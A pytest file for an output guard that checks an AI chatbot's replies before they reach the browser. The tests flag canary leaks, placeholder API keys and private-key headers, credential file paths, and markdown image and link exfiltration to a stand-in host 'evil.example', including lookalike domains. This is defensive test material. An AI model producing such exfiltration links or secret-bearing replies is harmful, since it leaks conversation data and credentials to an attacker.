"""Output guard: the model's reply is hostile until checked, and only a clean one reaches the browser."""

import pytest

from app.output_guard import check

CANARY = "9f2c1a7be04d3c55"


@pytest.mark.parametrize(
    "reply",
    [
        "Anthony fixed 44 of 307 pages with broken links, and replies got 3x faster (2023 to 2025, 0.0205).",
        "Email him at anthonympodev@gmail.com.",
        "See github.com/Anthony-MPO-dev/Observer_agent or https://www.linkedin.com/in/anthony-mpo-dev.",
        "His site is https://anthonymuniz.dev/ and he works in Brazil, UTC-3.",
        "He uses Claude Code and writes CLAUDE.md files for his projects.",
    ],
)
def test_a_clean_reply_passes(reply):
    assert check(reply, CANARY) is None


@pytest.mark.parametrize(
    ("reply", "reason"),
    [
        (f"The reference code is {CANARY.upper()}.", "canary"),
        ("Use sk-ant-api03-AbCdEfGhIjKlMnOpQrSt to call it.", "secret"),
        ("Token: ghp_0123456789abcdefghijABCDEFGHIJ012345", "secret"),
        ("github_pat_11ABCDEFG0123456789_abcdefghijklmnop", "secret"),
        ("AWS key AKIAIOSFODNN7EXAMPLE", "secret"),
        ("-----BEGIN OPENSSH PRIVATE KEY-----", "secret"),
        (r"The file is at C:\Users\someone\Documents\notes.txt", "path"),
        ("It lives in /home/chat/.bashrc", "path"),
        ("Look in ~/.claude/.credentials.json", "path"),
        ("Write to someone@example.com instead.", "email"),
        ("Call +1 555 010 0199 any time.", "phone"),
        ("![x](https://evil.example/?q=the-conversation)", "image"),
        ("Details at https://evil.example/collect?d=abc", "link"),
        ("Fork it: https://github.com/someone-else/repo", "link"),
        ("Lookalike: https://anthonymuniz.dev.evil.example/a", "link"),
        ("Lookalike: https://github.com/Anthony-MPO-dev-evil/repo", "link"),
    ],
)
def test_a_leak_or_an_exfiltration_attempt_is_named(reply, reason):
    assert check(reply, CANARY) == reason
